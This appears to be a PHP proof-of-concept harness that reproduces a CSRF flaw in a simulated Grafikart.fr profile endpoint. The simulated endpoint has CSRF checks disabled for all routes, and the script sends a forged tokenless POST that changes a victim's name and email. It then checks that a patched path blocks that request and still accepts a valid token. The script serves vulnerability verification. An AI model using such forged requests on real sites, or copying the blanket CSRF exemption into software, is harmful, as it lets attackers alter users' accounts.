<?php
require __DIR__ . '/vulnerable_app/grafikart_profile_sim.php';

function dump_json(string $label, mixed $value): void
{
    echo $label . "\n" . json_encode($value, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . "\n";
}

$victimSession = [
    'auth_user_id' => 42,
    'verified' => true,
    'csrf_token' => 'server-side-csrf-token',
];

$vulnerable = new GrafikartProfileSim(true);  // validateCsrfTokens(except: ['*'])
$patched = new GrafikartProfileSim(false);

$forgedPost = [
    'name' => 'CSRF Modified Name',
    'email' => 'csrf-modified@example.test',
];

echo "[*] Initial vulnerable user state:";
dump_json('', $vulnerable->getUser());

echo "\n[*] Attack: forged POST /profil without _token against vulnerable global CSRF-disabled path.\n";
$result = $vulnerable->handle('POST', '/profil', $forgedPost, $victimSession);
dump_json('[*] Vulnerable result:', $result);
if ($result['http_status'] !== 200 || $result['body']['user']['email'] !== 'csrf-modified@example.test' || $result['body']['csrf_config']['except'] !== ['*']) {
    fwrite(STDERR, "[FAIL] Expected tokenless POST to update profile because CSRF exceptions contain '*'.\n");
    exit(1);
}
echo "[PASS] CSRF reproduced: tokenless POST modified the authenticated user's profile.\n";

echo "\n[*] Control: same forged POST /profil against patched path.\n";
$blocked = $patched->handle('POST', '/profil', $forgedPost, $victimSession);
dump_json('[*] Patched missing-token result:', $blocked);
if ($blocked['http_status'] !== 419) {
    fwrite(STDERR, "[FAIL] Patched path should reject missing _token.\n");
    exit(1);
}
echo "[PASS] Patched control passed: CSRF middleware blocks tokenless profile update.\n";

echo "\n[*] Positive control: patched POST with valid _token.\n";
$valid = $forgedPost + ['_token' => 'server-side-csrf-token'];
$allowed = $patched->handle('POST', '/profil', $valid, $victimSession);
dump_json('[*] Patched valid-token result:', $allowed);
if ($allowed['http_status'] !== 200) {
    fwrite(STDERR, "[FAIL] Patched path should allow valid token.\n");
    exit(1);
}
echo "[PASS] Positive control passed: valid token preserves intended profile update behavior.\n";

echo "\nVULNERABLE: Grafikart.fr CAND-88f7e917dbe8 reproduced successfully.\n";
